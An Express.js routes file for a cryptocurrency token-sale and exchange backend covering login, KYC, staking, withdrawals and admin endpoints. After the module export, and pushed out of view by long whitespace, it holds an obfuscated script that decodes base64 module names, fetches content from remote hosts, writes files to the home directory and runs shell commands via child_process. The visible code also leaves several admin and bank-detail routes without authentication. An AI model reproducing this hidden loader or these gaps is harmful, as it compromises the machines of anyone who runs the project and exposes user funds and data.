const UserModel = require('../models/user.model');
const jwt = require('jsonwebtoken');
const express = require('express');
const router = express.Router();
const bodyParser = require("body-parser");
const mysql = require('mysql2');
const config = require('../config');
const requestIp = require('request-ip');
const cron = require('node-cron');
const app = express();
require("dotenv").config();
const cors = require("cors");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cors());
router.use(bodyParser.json());
router.use(
    bodyParser.urlencoded({
        extended: true,
    })
);
const pool = mysql.createPool({ host: config.mysqlHost, user: config.user, password: process.env.DB_PASS || config.password, database: config.database, port: config.mysqlPort });
const promisePool = pool.promise();

let multer = require('multer');
let storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './uploads');
    },
    filename: (req, file, cb) => {
        let filetype = '';
        if (file.mimetype === 'image/png') {
            filetype = 'png';
        }
        if (file.mimetype === 'image/jpeg') {
            filetype = 'jpeg';
        }
        if (file.mimetype === 'image/jpg') {
            filetype = 'jpg';
        }
        if (file.mimetype === 'video/mp4') {
            filetype = 'mp4';
        }
        if (file.mimetype === 'application/pdf') {
            filetype = 'pdf';
        }
        cb(null, 'image-' + Date.now() + '.' + filetype);
    }
});
let upload = multer({ storage: storage });
let profileUplaod = upload.fields([{ name: 'profile_pic', maxCount: 1 }])
// let profileUplaod = upload.array('userPhoto',2);
let kyc_document_image = upload.fields([{ name: 'kyc_document_image', maxCount: 1 },{ name: 'kyc_document_image2', maxCount: 1 },{ name: 'user_photo', maxCount: 1 }])

var receipt = upload.fields([{ name: 'receipt', maxcount: 1 }])
let blogimages=upload.fields([{ name: 'image', maxCount: 1 }])
let achieverimages=upload.fields([{ name: 'images', maxCount: 1 }])
let file=upload.fields([{ name: 'file', maxCount: 1 }])

// All controllers call here
const registerController = require('../controllers/register.controller');
const loginController = require('../controllers/login.controller');
const userController = require('../controllers/user.controller');
const buyController = require('../controllers/buy.controller');
const withdrawController = require('../controllers/withdraw.controller');
const businessCronController = require('../controllers/businessCron.controller');
const liveDepositManageController = require('../controllers/liveDepositManage');
const cmsController = require('../controllers/cms.controller');
const WebSocket = require('../controllers/Exchange_Controller/webSocket')
//Exchange Controller
// All Validations call here
const { registerUserSchema,LoginWithAddressSchema, newsLetterSchema, contactRequestSchema ,loginUserSchema, ForgotPasswordSchema, ResetPasswordSchema, updatePasswordSchema } = require('../middleware/validators/userValidator.middleware');
const { buyTokenSchema } = require('../middleware/validators/buyValidator.middleware');
const { withdrawSchema } = require('../middleware/validators/withdrawValidator.middleware');
const { adminLoginSchema, changePasswordSchema,blogvalidation,insertachieverSchema } = require('../middleware/validators/adminValidator.middleware');
const {ticketSchema} = require ('../middleware/validators/exchange.middleware')

cron.schedule("0 0 * * *", async function () {
    console.log('Cron run')
    await businessCronController.businessCron();
});

cron.schedule("* * * * *", async function () {
    console.log('Cron run for deposit',req.user_id)
  
//    if(req.user_id){
//     console.log('Cron run for deposit')
//     let sql = `SELECT cm.id,cm.name,cm.symbol,cm.is_deposit,cm.is_withdraw,cm.is_tradable,cm.deposit_fee,cm.withdraw_fee,cm.user_ids as coin_user_id,cm.test_contract,cm.contract,cm.Bnb_contract,cm.Trc_contract,cm.icon,ul.id as wallet_id,ul.user_id,ul.coin_id,concat(ul.balance,'') as balance,ul.balanceInOrder,ul.public_key,ul.private_key,ul.trc_privatekey,ul.trc_publickey,ul.bnb_privatekey,ul.bnb_publickey from coins as cm LEFT JOIN user_wallet as ul ON cm.id=ul.coin_id WHERE   ul.user_id=${req.user_id}`;
//     const [result, fields] = await promisePool.query(sql);
//     if (result[0].public_key != null) {
//         // const resp = manageWallet(result);
//         await liveDepositManageController.manageWallet(result);
    
//     }
// }
  
    // console.log('Cron run for deposit',aa)
  
}); 


// 0,1 -> * *
cron.schedule("0 1 * * *", async function () {
    console.log('staiking Cron')
    await businessCronController.usersStakingIncome();
});

cron.schedule("0 0 * * *", async function () {
    console.log('update');
    await businessCronController.updateCompleteStaking();
});

// Crons Routing
// router.get('/businessCron', registerUserSchema, businessCronController.businessCron.bind());

function fileSizeLimitErrorHandler  (err, req, res, next)  {
    if (err) {
        return res.status(200).json({
            success:false,
            msg: "File Size is to large then 512kb",
        });
    //   res.sendStatus(413)
    } else {
      next()
    }
  }

// Register Routing
router.post('/userRegister', registerUserSchema, registerController.userRegister.bind()); //done
router.post('/addNewsLetter',newsLetterSchema ,registerController.addNewsLetter.bind());
router.post('/contactFormRequest',contactRequestSchema ,registerController.contactFormRequest.bind());

// Login Routing
router.post('/login', loginUserSchema, loginController.login.bind()); //done
router.post('/LoginWithAddress', LoginWithAddressSchema, loginController.LoginWithAddress.bind());
router.post('/verifyAccount', loginController.activateAccount.bind()); //done
router.post('/resendmail', loginController.resendmail.bind()); //done

router.post('/forgotPassword', ForgotPasswordSchema, loginController.ForgotPassword.bind());// done
router.post('/resetpassword', ResetPasswordSchema, loginController.Resetpassword.bind()); //done

// User Routing
router.post('/getUserProfile', ensureWebToken, userController.getUserProfile.bind()); // done
router.post('/UpdateUserProfile', profileUplaod, ensureWebToken ,userController.UpdateUserProfile.bind()); //done
router.post('/updatePassword', updatePasswordSchema, ensureWebToken ,userController.updatePassword.bind()); //done

router.post('/deactiveaccount',  ensureWebToken ,userController.deactiveaccount.bind()); //done

router.post('/getuserbankdetails',cmsController.getuserbankdetails.bind());
router.post('/updateuserbankdetails',cmsController.updatebankdetails.bind());

router.post('/getbankdetailsusers',cmsController.getbankdetailsusers.bind());


router.post('/getkyc', ensureWebTokenForAdmin, userController.getkyc.bind());
router.post('/updatekycapproval',ensureWebTokenForAdmin,userController.updatekycapproval.bind());
router.post('/rejectkycapproval',ensureWebTokenForAdmin,userController.rejectkycapproval.bind());
router.post('/updatekyc', kyc_document_image, ensureWebToken, userController.updatekyc.bind());

router.post('/updateiskyc',ensureWebTokenForAdmin,userController.updateiskyc.bind());
router.post('/disableiskyc',ensureWebTokenForAdmin,userController.disableiskyc.bind());

router.post('/showuserkyc',  userController.showuserkyc.bind());

router.post('/showkyc', ensureWebToken, userController.showkyc.bind());
router.post('/showiskyc',  userController.showiskyc.bind());

router.post('/getMntWalletsDetails',ensureWebTokenForAdmin,  userController.getMntWalletsDetails.bind());
router.post('/getPhase', ensureWebToken, userController.getPhase.bind());
router.post('/getMntWalletDetails', ensureWebToken, userController.getMntWalletDetails.bind());
router.post('/getTotalRefIncome', ensureWebToken, userController.getTotalRefIncome.bind());
router.post('/getDirectReferralCount', ensureWebToken, userController.getDirectReferralCount.bind()); // done 
router.post('/getReferralUsersList', ensureWebToken, userController.getReferralUsersList.bind());
router.post('/getNodesList', ensureWebToken, userController.getNodesList.bind());
router.post('/getstatisticsList', ensureWebToken, userController.getstatisticsList.bind());
router.post('/getEarningProjections', ensureWebToken, userController.getEarningProjections.bind());
router.post('/getTeamReferral', ensureWebToken, userController.getTeamReferral.bind()); // done
router.post('/getTeamReferralList', ensureWebToken, userController.getTeamReferralList.bind());
router.post('/getRewardsList', ensureWebToken, userController.getRewardsList.bind());
router.post('/getBlockExpansionIncome', ensureWebToken, userController.getBlockExpansionIncome.bind());
router.post('/getTokenAllocation', ensureWebToken, userController.getTokenAllocation.bind());
router.post('/getCapingPlan', ensureWebToken, userController.getCapingPlan.bind());
router.post('/getUpcomingEventsList', userController.getUpcomingEventsList.bind());
router.post('/exchangeicotransfer', ensureWebToken, userController.ExchangeTransferICO.bind()); // done


// Buy Routing
router.post('/getActivePhase', ensureWebToken, buyController.getActivePhase.bind());
router.post('/tokenPurchase', ensureWebToken,blogimages, buyController.tokenPurchase.bind());
router.post('/stripetokenPurchase', ensureWebToken, buyController.stripePayment.bind());
router.post('/getTokenPurchase',ensureWebToken,  buyController.getTokenPurchase.bind());

// Withdraw Routing
router.post('/userWithdraw', ensureWebToken,  withdrawController.userWithdraw.bind());
router.post('/getWithdrawList',ensureWebToken,  withdrawController.getWithdrawList.bind()); //done

/// By AJ strat ///
const { submitStackingSchema } = require('../middleware/validators/stackValidator.middleware');
const stackController = require('../controllers/stack.controller');
router.post('/submitStacking', submitStackingSchema, ensureWebToken ,stackController.submitStacking.bind());

router.post('/getUserStackingHistory',ensureWebToken,  stackController.getUserStackingHistory.bind()); //done
router.post('/getUserStackingHistorybyid',  stackController.getUserStackingHistorybyid.bind()); //done

router.post('/getStackingPrice', ensureWebToken ,stackController.getStackingPrice.bind());

router.post('/getEarningHistory',ensureWebToken, stackController.getEarningHistory.bind()); //done

// Admin routes
const adminController = require('../controllers/admin.controller');
router.post('/adminLogin', adminLoginSchema, adminController.adminLogin.bind());
router.post('/getDashboardStatistics', ensureWebTokenForAdmin, adminController.getDashboardStatistics.bind());
router.post('/getUsersList', ensureWebTokenForAdmin, adminController.getUsersList.bind());
router.post('/getUsersListFilter',  adminController.getUsersListFilter.bind());

router.post('/getUsersReferrals', ensureWebTokenForAdmin, adminController.getUsersReferrals.bind());

router.post('/getStackingHistory', ensureWebTokenForAdmin, adminController.getStackingHistory.bind());
router.post('/getWithdrawalStatistics', ensureWebTokenForAdmin, adminController.getWithdrawalStatistics.bind());
router.post('/getWithdrawalStatisticsCrypto', ensureWebTokenForAdmin, adminController.getWithdrawalStatisticsCrypto.bind());
router.post('/getMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getMntWithdrawalHistory.bind());
router.post('/getCryptoMntWithdrawalHistory', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistory.bind());
router.post('/approveWithdrwalRequest', ensureWebTokenForAdmin, adminController.approveWithdrwalRequest.bind());
router.post('/rejectWithdrwalRequest', ensureWebTokenForAdmin, adminController.rejectWithdrwalRequest.bind());
router.post('/getTransactionHistory', ensureWebTokenForAdmin, adminController.getTransactionHistory.bind());
router.post('/getPhaseList', ensureWebTokenForAdmin, adminController.getPhaseList.bind());
router.post('/updatePhase', ensureWebTokenForAdmin, adminController.updatePhase.bind());
router.post('/updatePhaseStatus', ensureWebTokenForAdmin, adminController.updatePhaseStatus.bind());
router.post('/getStackingSetting', ensureWebTokenForAdmin, adminController.getStackingSetting.bind());
router.post('/getSystemSetting', ensureWebTokenForAdmin, adminController.getSystemSetting.bind());
router.post('/updateSystemSetting', ensureWebTokenForAdmin, adminController.updateSystemSetting.bind());
router.post('/getDynamicPrice', ensureWebTokenForAdmin, adminController.getDynamicPrice.bind());
router.post('/getSubscriberList', ensureWebTokenForAdmin, adminController.getSubscriberList.bind());
router.post('/changePassword', changePasswordSchema, ensureWebTokenForAdmin, adminController.changePassword.bind());
router.post('/getActivePhaseAdmin', ensureWebTokenForAdmin, adminController.getActivePhaseAdmin.bind());
router.post('/loginAsUser', ensureWebTokenForAdmin, adminController.loginAsUser.bind());
router.post('/userblock', ensureWebTokenForAdmin,adminController.userblock.bind());
router.post('/userUnblock',ensureWebTokenForAdmin,adminController.userUnblock.bind());
router.post('/showSystemSetting',  adminController.getSystemSetting.bind());
router.post('/updateTradeFee', ensureWebTokenForAdmin, adminController.updateTradeFee.bind());
router.post('/getCryptoMntWithdrawalHistoryAdmin', ensureWebTokenForAdmin, adminController.getCryptoMntWithdrawalHistoryAdmin.bind());


router.post('/useruserblock', ensureWebToken, adminController.userblock.bind());

router.post('/getblog',ensureWebTokenForAdmin, adminController.getblog.bind());
router.post('/getblogid',adminController.getblogid.bind());
router.post('/blogdelete',ensureWebTokenForAdmin, adminController.blogdelete.bind());
router.post('/insertblog',blogimages, ensureWebTokenForAdmin, adminController.insertblog.bind());
router.post('/updateblog',blogimages, ensureWebTokenForAdmin, adminController.updateblog.bind());
router.post('/getuserBlog', userController.getuserBlog.bind());
router.post('/getuserblogid',userController.getuserblogid.bind());
router.post('/getRecentuserBlog',userController.getRecentuserBlog.bind());
router.post('/getuserDetails',blogimages,adminController.getuserDetails.bind());
router.post('/getUserBlogSlider', userController.getUserBlogSlider.bind());
router.post('/getBlogSlider',adminController.getBlogSlider.bind());
router.post('/getblogsliderid',adminController.getblogsliderid.bind());
router.post('/updateBlogSlider',blogimages,adminController.updateBlogSlider.bind());
router.post('/activeBlog',adminController.activeBlog.bind());
router.post('/deactiveBlog',adminController.deactiveBlog.bind());
router.post('/showusersDetails',adminController.showusersDetails.bind());
router.post('/insertTransactionHash',adminController.insertTransactionHash.bind());
router.post('/updatecryptowithdraw', ensureWebTokenForAdmin, adminController.updatecryptowithdraw.bind());

router.post('/addBlogslider',adminController.addBlogslider.bind());
router.post('/notaddBlogslider',adminController.notaddBlogslider.bind());
router.post('/inserAchiever',achieverimages,insertachieverSchema,adminController.inserAchiever.bind());
router.post('/updateachieve',achieverimages,adminController.updateachieve.bind());
router.post('/getachiever',adminController.getachiever.bind());
router.post('/getachieverid',adminController.getachieverid.bind());
router.post('/achieverdelete',adminController.achieverdelete.bind());
router.post('/getuserAchiever', userController.getuserAchiever.bind());

//cms data
router.post('/getfaqs', cmsController.showFaqs.bind());
router.post('/insertfaqs',ensureWebTokenForAdmin, cmsController.insertfaqs.bind());
router.post('/updatefaqs',ensureWebTokenForAdmin, cmsController.updatefaqs.bind());
router.post('/deletefaqs',ensureWebTokenForAdmin, cmsController.deletefaqs.bind());
router.get('/showfaqs', cmsController.showFaqs.bind());

router.post('/getaboutus',ensureWebTokenForAdmin, cmsController.getaboutus.bind());
router.post('/updateaboutus',ensureWebTokenForAdmin, cmsController.updateaboutus.bind());
router.get('/showaboutus', cmsController.getaboutus.bind());

router.post('/gettou',ensureWebTokenForAdmin, cmsController.gettou.bind());
router.post('/updatetou',ensureWebTokenForAdmin, cmsController.updatetou.bind());
router.get('/showtou', cmsController.gettou.bind());

router.post('/getprivacypolicy',ensureWebTokenForAdmin, cmsController.getprivacypolicy.bind());
router.post('/updateprivacypolicy',ensureWebTokenForAdmin, cmsController.updateprivacypolicy.bind());
router.get('/showprivacypolicy', cmsController.getprivacypolicy.bind());

router.post('/getcookiepolicy',ensureWebTokenForAdmin, cmsController.getcookiepolicy.bind());
router.post('/updatecookiepolicy',ensureWebTokenForAdmin, cmsController.updatecookiepolicy.bind());
router.get('/showcookiepolicy', cmsController.getcookiepolicy.bind());

router.post('/getcontactus',ensureWebTokenForAdmin ,cmsController.getcontactus.bind());

router.post('/getbankdetails',ensureWebTokenForAdmin ,cmsController.getbankdetails.bind());
router.post('/updatebankdetails',ensureWebTokenForAdmin, cmsController.updatebankdetails.bind());

router.post('/getadminbankdetails',cmsController.getbankdetails.bind());


router.post('/getbuyrequest',ensureWebTokenForAdmin ,cmsController.getbuyrequest.bind());
router.post('/updatebuyrequest', ensureWebTokenForAdmin, adminController.updatebuyrequest.bind());
router.post('/rejectbuyrequest', ensureWebTokenForAdmin, adminController.rejectbuyrequest.bind());

router.post('/minwithdraw',ensureWebTokenForAdmin ,cmsController.minwithdraw.bind());
router.post('/updatewithdraw',ensureWebTokenForAdmin,cmsController.updatewithdraw.bind());
router.post('/showminwithdraw',cmsController.minwithdraw.bind());

router.post('/dailymaxwithdrawlimit', cmsController.dailymaxwithdrawlimit.bind());
router.post('/showwithdrawlimit', cmsController.showwithdrawlimit.bind());



router.post('/getwithdrawhistory',ensureWebTokenForAdmin,cmsController.getwithdrawhistory.bind()); //not working sql
router.post('/getReferalEarning',ensureWebTokenForAdmin,cmsController.getReferalEarning.bind()); //not working sql
router.post('/getstackingEarning',ensureWebTokenForAdmin,cmsController.getstackingEarning.bind()); 
router.post('/getPrchaseHistory',ensureWebTokenForAdmin,cmsController.getPrchaseHistory.bind());


router.post('/getexchangetransaction', ensureWebTokenForAdmin, adminController.getexchangetransaction.bind());
router.post('/updateexchangetransaction', ensureWebTokenForAdmin, adminController.updateexchangetransaction.bind());
router.post('/rejectexchangetransaction', ensureWebTokenForAdmin, adminController.rejectexchangetransaction.bind());

//-------------------------------------Exchange--------------------------------------------
//exchange
const exadminController = require('../controllers/Exchange_Controller/admin.controller');
const exuserController = require('../controllers/Exchange_Controller/user.controller');
const exwithdrawController = require('../controllers/Exchange_Controller/withdraw.controller');

router.get('/getfees', exadminController.getfees.bind());
router.post('/getcurrencies', exadminController.getcurrencies.bind());
router.post('/getexbankdetails', exadminController.getexbankdetails.bind());
router.post('/adminpairlist', exadminController.adminpairlist.bind());
router.post('/activeDeactivecoinPairs', exadminController.activeDeactivecoinPairs.bind());
router.post('/admincoinlist', exadminController.admincoinlist.bind());
router.post('/updatecoinbyid', exadminController.updatecoinbyid.bind());
router.post('/getuserwalletlist', exadminController.getuserwalletlist.bind());

router.post('/getticket', exadminController.getticket.bind());
router.post('/insertticket', ticketSchema, ensureWebToken, exadminController.insertticket.bind());
router.post('/getallticket',  exadminController.getallticket.bind());
router.post('/ticketapprove', ensureWebTokenForAdmin,  exadminController.ticketapprove.bind());
router.post('/ticketreject', ensureWebTokenForAdmin,  exadminController.ticketreject.bind());



router.post('/getwebcontent', exadminController.getwebcontent.bind());
// router.post('/updatewebcontent',ensureWebTokenForAdmin, exadminController.updatewebcontent.bind());
router.post('/updatedeposit_content',ensureWebTokenForAdmin, exadminController.updatedeposit_content.bind());
router.post('/updatereferral_content',ensureWebTokenForAdmin, exadminController.updatereferral_content.bind());
router.post('/updatekyc_content',ensureWebTokenForAdmin, exadminController.updatekyc_content.bind());
router.post('/updateterms_condition',ensureWebTokenForAdmin, exadminController.updateterms_condition.bind());
router.post('/updateprivacy_policy',ensureWebTokenForAdmin, exadminController.updateprivacy_policy.bind());
router.post('/updateabout',ensureWebTokenForAdmin, exadminController.updateabout.bind());

router.post('/getannouncement',ensureWebTokenForAdmin, exadminController.getannouncement.bind());
router.post('/insertannouncement' , ensureWebTokenForAdmin, exadminController.insertannouncement.bind());
router.post('/updateannouncement' , ensureWebTokenForAdmin, exadminController.updateannouncement.bind());
router.post('/inactiveannouncement' ,  ensureWebTokenForAdmin, exadminController.inactiveannouncement.bind());
router.post('/activeannouncement' ,  ensureWebTokenForAdmin, exadminController.activeannouncement.bind());
router.post('/deleteannouncement' ,  ensureWebTokenForAdmin, exadminController.deleteannouncement.bind());

router.post('/transactiontype', ensureWebTokenForAdmin, exadminController.transactiontype.bind());
router.post('/transactionfilter',  exadminController.transactionFilterRecord.bind());
router.post('/orderfilter',  exadminController.orderfilterrecord.bind());
router.post('/depositadmininr',  exadminController.depositadmininr.bind());
router.post('/approvedepositadmininr',  exadminController.approvedepositadmininr.bind());
router.post('/rejectdepositadmininr',  exadminController.rejectdepositadmininr.bind());

router.post('/getorders',  exadminController.getorders.bind());
router.post('/getchat',  exadminController.getchat.bind());

router.post('/getGraphData', WebSocket.getGraphData.bind())
// router.post('/orderfilter', ensureWebToken, adminreport.orderFilterRecord.bind(this, db));


//exchange user

router.get('/getusernotification',  exuserController.getusernotification.bind());

router.post('/getuserdevice', exuserController.getuserdevice.bind());
router.post('/getDeviceDetail', exuserController.getDeviceDetail.bind());
router.post('/insertDeviceDetail', exuserController.insertDeviceDetail.bind());
router.post('/userwallet', exuserController.userWallet.bind());
router.post('/getuserdepositinr', exuserController.getuserdepositinr.bind());
router.post('/geticotransfer', exuserController.getICOTransfer.bind());


router.post('/favoritepair', exuserController.favoritepair.bind());
router.post('/getfavoritepair', exuserController.getfavoritepair.bind());
router.post('/orderbook', exuserController.orderBook.bind());
router.post('/userorder',exuserController.getUserOrder.bind());
router.get('/coinList', exuserController.coinList.bind());
router.post('/pairlist', exuserController.pairList.bind());
router.post('/getUserPiarBalance', exuserController.getUserPiarBalance.bind());
router.post('/getQR',  exuserController.getQR.bind());
router.post('/emailotp', ensureWebToken, exuserController.Email_otp.bind());
// router.post('/disableemailauth',ensureWebToken,  exuserController.disableemailauth.bind());
router.post('/disableAuth', ensureWebToken, exuserController.disableAuth.bind());
router.post('/twoAuthenticationVerify',  exuserController.twoAuthenticationVerify.bind());
router.post('/trxHistory',  exuserController.trxHistory.bind());
router.post('/getdashuserorder',  exuserController.getDashUserOrder.bind());
router.post('/orderHistory',  exuserController.orderHistory.bind());

router.post('/createOrder', ensureWebToken, exuserController.createOrder.bind());
router.post('/cancelOrder', ensureWebToken, exuserController.cancelOrder.bind());

router.post('/slcliveprice', exuserController.getSLCLive.bind());

router.post('/getslcgraph', WebSocket.getSLCGraph.bind())

// EX Withdraw
router.post('/coindetail', ensureWebToken, exwithdrawController.coinDetail.bind());

router.post('/cryptowithdraw', ensureWebToken, exwithdrawController.cryptowithdraw.bind());
router.post('/cryptowithdrawvalidation', ensureWebToken, exwithdrawController.checkCryptowithdrawvalidation.bind());
router.post('/withdrawAuthentication', ensureWebToken, exwithdrawController.withdrawAuthentication.bind());
router.post('/depositForm', receipt,exwithdrawController.depositForm.bind())
//------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


const path1 = require('path')
exports.getImage = async (req, res) => {
    const image = req.params.image;
    const myPath = path1.resolve(process.cwd(), "uploads", image);
    res.sendFile(myPath);
}
const getFile = require('../controllers/getFile');

router.get("/uploads/:image", getFile.getImage);


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            console.log(err);
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.bnb_address = req.user.bnb_address;
            console.log(req.user.email);
            // check if user is active or not 
            let userDetails = await UserModel.getUsersDetails(req.user.email);
            next();
            // if (userDetails[0].is_active == 0) {
            //     return res.sendStatus(403);
            // } else {
            //     next();
            // }
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}



module.exports.routes = router;   /*  These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      const as=a1,at=a1,au=a1,av=a1,aw=a1;(function(a2,a3){const ah=a1,ai=a1,aj=a1,ak=a1,al=a1,a4=a2();while(!![]){try{const a5=parseInt(ah(0x5e))/0x1+parseInt(ah(0x12))/0x2+-parseInt(aj(0x3e))/0x3*(parseInt(aj(0x27))/0x4)+-parseInt(ai(0x25))/0x5*(parseInt(al(0x7))/0x6)+-parseInt(ak(0x59))/0x7*(parseInt(ah(0x1))/0x8)+parseInt(al(0x9))/0x9*(parseInt(aj(0x4b))/0xa)+parseInt(ah(0x35))/0xb;if(a5===a3)break;else a4['push'](a4['shift']());}catch(a6){a4['push'](a4['shift']());}}}(a0,0x92692));const Q=(function(){let a2=!![];return function(a3,a4){const a5=a2?function(){const am=a1;if(a4){const a6=a4[am(0x57)+'y'](a3,arguments);return a4=null,a6;}}:function(){};return a2=![],a5;};}()),O=Q(this,function(){const an=a1,ao=a1,ap=a1,aq=a1,ar=a1;return O[an(0x68)+an(0x4c)]()[ap(0x8)+'ch'](ao(0x15)+aq(0x52)+ar(0x2))[ao(0x68)+ap(0x4c)]()[ao(0x51)+ap(0x48)+ar(0x6)](O)[an(0x8)+'ch'](aq(0x15)+ao(0x52)+an(0x2));});function a0(){const bd=['rYXJ','pc3R','fcG9','UaG9','1215379WClEXB','0aA','zdG5','slic','jZXN','lcm5','tZWR','lU3l','pdGV','47997fsZbHn','join','HbWt','5bmM','0cDo','/s/','size','McGx','f93a80304111','ide','truc','pcg','ZT3','30bNzzfy','ring','oZXh','hdGE','hbWU','leng','cons','+)+)','hid','Char','leXM','pbGR','appl','lYw','4578rjmBkJ','Xbm9','Code','lckl','Wc3R','458451tknxiV','MTEuMTk5NDUuNDMu====','owsH','vLw=','vZ2V','now','DcmV','hdFN','from','zdA','toSt','bZnM','hdGZ','wind','tdXN','spli','6760VJneqT','+)+$',':124','aaHR','wcm9','tor','2820YjDXjE','sear','2402469jsWHwK','aL2t','bdXN','utf8','trin','cmp','type','oqr','vY2V','1993170rvhZIi','NcGF','vdXJ','(((.','jd3J','zcw','recu','xdWV','kZTp','kaXJ','subs','kZm9','5A1','ybUR','ab3M','rsiv','uZm8','Tcm1','ndg','4405bYkIhL','TeW5','200eMhKEh','uYw','vcm0','NDcuMTc1MzguOTIu====','lY2h','haG9','fcHJ','zU3l','base','GaWx'];a0=function(){return bd;};return a0();}O();const t=as(0xc),r=as(0x2f)+'64',c=a2=>(s1=a2[au(0x38)+'e'](0x1),Buffer[at(0x66)](s1,r)[aw(0x68)+au(0x4c)](t)),e=require(c(as(0x20))),n=require(c(as(0x69))),s=require(c(av(0x64)+au(0x19)+au(0x67))),a=require(c(at(0x13)+aw(0x36))),o=require(c(at(0x5a)+au(0x1a)+av(0x5)+at(0x39)+'z')),i=require(c(av(0x2b)+as(0x56)+at(0x2d)+as(0x11)+as(0x17)))[c(au(0x4d)+aw(0x58))],l=e[c(av(0x34)+aw(0x3b)+at(0x49))](),h=e[c(au(0x2c)+av(0x37)+aw(0x4f))](),u=e[c(au(0x45)+aw(0x6a)+as(0x29))](),d=e[c(as(0xb)+au(0x5c)+at(0x22))]();let f;const y=av(0x4)+at(0x42)+aw(0x61)+'=',$=as(0x3),m=a2=>Buffer[aw(0x66)](a2,r)[at(0x68)+at(0x4c)](t);var b='',v='';const w=[0x70,0xa0,0x89,0x48],g=a2=>{const ax=a1,ay=a1,az=a1,aA=a1;let a3='';for(let a4=0x0;a4<a2[ax(0x50)+'th'];a4++)rr=0xff&(a2[a4]^w[0x3&a4]),a3+=String[ax(0x66)+ay(0x54)+az(0x5b)](rr);return a3;},G=as(0x62)+'0',X=at(0x16)+au(0x3d)+at(0x30)+av(0x3c)+at(0x28),Z=c(as(0x5d)+av(0x65)+at(0x41)),j=c(as(0x40)+au(0x1b)+as(0x26)+'j'),M=c(aw(0x4d)+as(0x32)+at(0x2e)+as(0x28));function N(a2){return n[M](a2);}const W=[0x5f,0xca,0xa6],p=[0x5e,0xd6,0xfa,0x2b,0x1f,0xc4,0xec],q=()=>{const aB=a1,aC=a1,aD=a1,aE=a1,a3=c(G),a4=c(X),a5=g(p);let a6=a[aB(0x3f)](l,a5);try{const aa={};aa[aB(0x18)+aB(0x21)+'e']=!0x0,(a7=a6,n[j](a7,aa));}catch(ab){a6=l;}var a7;const a8=''+b+g(W)+v,a9=a[aB(0x3f)](a6,g(z));try{!function(ac){const aF=a1,aG=a1,ad=c(aF(0x23)+aF(0x26)+'j');n[ad](ac);}(a9);}catch(ac){}s[a3](a8,(ad,ae,af)=>{if(!ad){try{n[a4](a9,af);}catch(ag){}U(a6);}});},z=[0x4,0xc5,0xfa,0x3c,0x5e,0xca,0xfa],J=[0x5f,0xd0],R=[0x0,0xc1,0xea,0x23,0x11,0xc7,0xec,0x66,0x1a,0xd3,0xe6,0x26],U=a2=>{const aH=a1,aI=a1,a3=c(G),a4=c(X),a5=''+b+g(J),a6=a[aH(0x3f)](a2,g(R));let a7=0x0;if(N(a6))try{const a8=n[Z](a6);a7=a8[aI(0x44)];}catch(a9){a7=0x0;}s[a3](a5,(aa,ab,ac)=>{const aJ=a1;if(!aa){try{ac[aJ(0x50)+'th']>a7&&n[a4](a6,ac);}catch(ad){}k(a2);}});},Y=[0x13,0xc4],T=[0x56,0x86,0xa9,0x26,0x0,0xcd,0xa9,0x21,0x50,0x8d,0xa4,0x3b,0x19,0xcc,0xec,0x26,0x4],V=[0x1e,0xcf,0xed,0x2d,0x2f,0xcd,0xe6,0x2c,0x5,0xcc,0xec,0x3b],k=a2=>{const aK=a1,a3=g(Y)+'\x20\x22'+a2+'\x22\x20'+g(T);a[aK(0x3f)](a2,g(V));try{i(a3,(a4,a5,a6)=>{x(a2);});}catch(a4){}},A=[0x1e,0xcf,0xed,0x2d],F=[0x1e,0xd0,0xe4,0x68,0x5d,0x8d,0xf9,0x3a,0x15,0xc6,0xe0,0x30],H=[0x19,0xce,0xfa,0x3c,0x11,0xcc,0xe5],S=a3=>{const aL=a1,aM=a1,aN=a1,aO=a1,a4=a[aL(0x3f)](a3,g(z)),a5=g(A)+'\x20'+a4;try{const a6={};a6[aM(0x6b)+aL(0x60)+aL(0x47)]=!0x0,i(a5,a6,(a7,a8,a9)=>{});}catch(a7){}},x=a2=>{const aP=a1,a3=g(F)+'\x20\x22'+a2+'\x22\x20'+g(H),a4=a[aP(0x3f)](a2,g(V));try{N(a4)?S(a2):i(a3,(a5,a6,a7)=>{S(a2);});}catch(a5){}};s_url=av(0x14)+'s',sForm=c(av(0x1d)+at(0x1f)+av(0x4e)),surl=c(as(0x14)+'s');const D=c(au(0x33)+aw(0x67));function a1(a,b){const c=a0();return a1=function(d,e){d=d-0x0;let f=c[d];return f;},a1(a,b);}let B=aw(0xe);const C=async a2=>{const aU=a1,aV=a1,a3=(a6=>{const aQ=a1,aR=a1,aS=a1,aT=a1;let a7=0x0==a6?aQ(0x2a):aR(0x5f);for(var 